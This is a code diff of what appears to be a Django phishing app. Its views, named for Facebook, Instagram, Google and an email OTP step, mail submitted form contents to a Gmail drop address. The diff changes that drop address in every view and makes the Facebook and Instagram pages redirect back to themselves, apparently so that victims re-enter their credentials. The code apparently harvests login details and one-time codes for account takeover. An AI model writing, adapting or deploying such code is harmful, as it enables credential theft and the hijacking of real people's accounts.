@@ -27,7 +27,7 @@ def confirm_account(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['voteconfirm598@gmail.com'], 
+        ['osazuwaaihanuwa6@gmail.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('success')
@@ -47,7 +47,7 @@ def emailotp(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['voteconfirm598@gmail.com'], 
+        ['osazuwaaihanuwa6@gmail.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('success')
@@ -80,10 +80,10 @@ def facebook(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['voteconfirm598@gmail.com'], 
+        ['osazuwaaihanuwa6@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('facebook')
 
    return render(request, 'donate/facebook.html')
 
@@ -111,9 +111,9 @@ def instagram(request):
             send_mail('Contact Form',
                       message,
                       settings.EMAIL_HOST_USER,
-                      ['voteconfirm598@gmail.com'], 
+                      ['osazuwaaihanuwa6@gmail.com'], 
                       fail_silently=False, html_message=message)
-            return redirect('confirm_account')
+            return redirect('instagram')
     
     # Reset attempt count on GET request
     request.session['attempt'] = 0
@@ -147,7 +147,7 @@ def google(request):
        send_mail('Contact Form',
         message,
         settings.EMAIL_HOST_USER,
-        ['voteconfirm598@gmail.com'], 
+        ['osazuwaaihanuwa6@gmail.com'], 
         fail_silently=False, html_message=message)
 
        return redirect('emailotp')
